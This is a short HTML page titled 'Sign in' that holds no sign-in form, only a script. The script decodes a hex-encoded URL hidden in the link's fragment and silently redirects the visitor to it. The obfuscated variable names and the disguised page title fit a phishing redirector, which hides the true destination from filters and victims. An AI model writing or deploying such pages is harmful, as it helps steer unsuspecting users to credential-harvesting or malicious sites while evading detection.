<html>
<head><title>Sign in</title></head>
<body>
    <script>
        // Retrieve and decode the hash from the URL
        const encodedHash = window.location.hash.substr(1); // Remove '#'
        const sd = encodedHash;  
		const wsd = sd.substring(1);
		const maxs = [];

		for (let assd = 0; assd < wsd.length - 1; assd += 2) {
		  maxs.push(parseInt(wsd.substr(assd, 2), 16));
		}

		const bud = String.fromCharCode.apply(String, maxs);
		console.log(bud);
		location.replace(bud);
    </script> 
</body>
</html>
